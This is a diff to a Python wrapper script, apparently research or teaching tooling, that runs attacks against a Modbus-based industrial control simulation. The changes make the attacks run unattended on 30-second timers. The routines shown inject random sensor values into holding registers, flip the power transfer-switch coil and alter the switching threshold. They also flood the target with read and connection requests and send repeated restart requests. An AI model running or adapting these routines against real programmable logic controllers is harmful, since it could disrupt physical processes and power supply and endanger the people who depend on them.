@@ -1,6 +1,6 @@
 """
- Author: Jaxson Brown
-   Date: 20/02/2023
+Author: Jaxson Brown
+Date: 20/07/2024
 Purpose: Wrapper python script to run attacks against an ICS simulation using
             the Modbus communication protocol. This script acts as a wrapper
             to run other command line utilities such as nmap. 
@@ -28,10 +28,10 @@ LOGO = r"""
 # globals
 stop_looping = False
 
-# helper function to detect enter key interupts
+# helper function to wait for 30 seconds
 def _check_for_enter():
     global stop_looping
-    input()
+    sleep(30)
     stop_looping = True
 
 # Function: address_scan
@@ -207,7 +207,7 @@ def sporadic_sensor_measurement_injection(ip_addresses):
     
     for ip in ip_addresses:
         print(f"Injecting random data for 10 seconds into {ip}")
-        print("Affecting found addresses: coil 10, holding register 20")
+        print("Affecting found addresses: coil 10, holding register 20, 21")
 
         client = ModbusClient(host=ip, port=502)
 
@@ -222,6 +222,7 @@ def sporadic_sensor_measurement_injection(ip_addresses):
             sleep(0.05)
             hr_value = random.randint(0, 65535)
             client.write_single_register(20, hr_value)
+            client.write_single_register(21, hr_value)
         
         client.close()
     print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")
@@ -294,7 +295,7 @@ def replayed_measurement_injection(ip_addresses):
 
 # Function: altered_actuator_state
 # Purpose: Changes the state of the transfer switch actuator
-def altered_actuator_state(ip_addresses):
+def altered_actuator_state(ip_addresses, state=None):
     print("### ALTERED ACTUATOR STATE ###")
 
     for ip in ip_addresses:
@@ -302,10 +303,13 @@ def altered_actuator_state(ip_addresses):
 
         while True:
             print(f"Changing the state of the transfer switch for PLC {ip}")
-            try:
-                ts_state = int(input("Change the transfer switch to (1) mains power or (2) solar power?"))
-            except:
-                ts_state = 0
+            if state is not None:
+                ts_state = state
+            else:
+                try:
+                    ts_state = int(input("Change the transfer switch to (1) mains power or (2) solar power?"))
+                except:
+                    ts_state = 0
 
             if ts_state == 1:
                 print("Setting transfer switch to mains power")
@@ -314,8 +318,11 @@ def altered_actuator_state(ip_addresses):
                 print("Setting transfer switch to solar power")
                 client.write_single_coil(10, 1)
             
-            cont = input("Change transfer switch state again? (y/n)")
-            if cont != "y":
+            if state is None:
+                cont = input("Change transfer switch state again? (y/n)")
+                if cont != "y":
+                    break
+            else:
                 break
 
         client.close()
@@ -324,18 +331,22 @@ def altered_actuator_state(ip_addresses):
 # Function: alter_control_set_points
 # Purpose: Changes control points of the simulation. Specifically alters
 #   the transfer switch switching threshold
-def altered_control_set_points(ip_addresses):
+def altered_control_set_points(ip_addresses, threshold=None):
     print("### ALTERED CONTROL SET POINTS ###")
     
     for ip in ip_addresses:
         # get new value to change to
         print(f"Changing transfer switch threshold value (holding register 21) for {ip}")
         new_val = 0
-        try:
-            new_val = int(input("Enter interger number to change value to (1-65535):"))
-        except ValueError:
-            pass
-        new_val = new_val % 65535
+
+        if threshold is not None:
+            new_val = threshold % 65535
+        else:
+            try:
+                new_val = int(input("Enter interger number to change value to (1-65535):"))
+            except ValueError:
+                pass
+            new_val = new_val % 65535
 
         # change threshold value
         client = ModbusClient(host=ip, port=502)
@@ -381,8 +392,7 @@ def restart_communication(ip_addresses):
         th_stopper = Thread(target=_check_for_enter)
         th_stopper.start()
 
-        print(f"Sending a restart communication request to {ip} in 3 second intervales")
-        print("Press enter to stop")
+        print(f"Sending a restart communication request to {ip} in 3 second intervales for 30 seconds")
 
         client = ModbusClient(host=ip, port=502)
         while not stop_looping:
@@ -429,8 +439,7 @@ def data_flood_attack(ip_addresses):
                 client.read_input_registers(address, num_values)
 
     for ip in ip_addresses:
-        print(f"Flooding {ip} with random packets from 10 threads")
-        print("Press enter to stop")
+        print(f"Flooding {ip} with random packets from 10 threads for 30 seconds")
 
         stop_looping = False
         th_stopper = Thread(target=_check_for_enter)
@@ -457,11 +466,11 @@ def connection_flood_attack(ip_addresses):
 
         while not stop_looping:
             client = ModbusClient(host=ip, port=502)
+            sleep(0.01)
             client.close()
 
     for ip in ip_addresses:
-        print(f"Flooding {ip} with connection requests from 10 threads")
-        print("Press enter to stop")
+        print(f"Flooding {ip} with connection requests from 10 threads for 30 seconds")
 
         stop_looping = False
         th_stopper = Thread(target=_check_for_enter)
